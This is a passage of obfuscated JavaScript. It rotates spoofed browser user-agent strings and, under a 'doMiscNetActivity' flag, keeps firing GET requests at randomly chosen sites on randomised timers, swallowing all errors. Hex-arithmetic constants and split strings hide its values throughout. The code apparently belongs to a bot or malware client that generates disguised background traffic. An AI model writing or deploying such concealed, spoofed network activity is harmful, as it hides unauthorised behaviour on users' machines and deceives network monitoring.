      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xbe9 + -0x40b + 0xff4; k < 0x658 + -0x1 * 0x481 + -0x1d3; k++)
    setTimeout(f, (-0x3d6e * -0x7 + -0x89e * -0x8 + 0x1 * -0x10892) * k * getRandomInt(-0x1e62 + 0x11f + 0x1d44, 0xd19 + -0x1e05 + -0x11 * -0xff));
  setInterval(() => {
    f();
    for (let l = -0x7 * -0x313 + 0x531 + -0x1a * 0x107; l < 0xa40 + 0x1812 + -0x1 * 0x224e; l++)
      setTimeout(f, (-0x1c1b3 + -0x116e8 + 0x1 * 0x3c2fb) * l * getRandomInt(0x175a + 0x7db * -0x2 + -0x7a3, 0x1 * 0x1a8c + -0x26a6 + 0xc1d));
  }, 0x5248c1 * 0x1 + -0x14ec7 * -0x43 + -0x72f856);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a7 = d;
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })[a7(0x16)](h => {});
  }, (0xd0c + -0x1 * -0x155e + -0x16a * 0x5) * getRandomInt(0x97 * -0x3b + -0x1c02 + 0x3ed0, -0x1289 + 0x350 + 0xf3e));
}, 0x1a7 + -0x13d9 * 0x1 + 0x1296);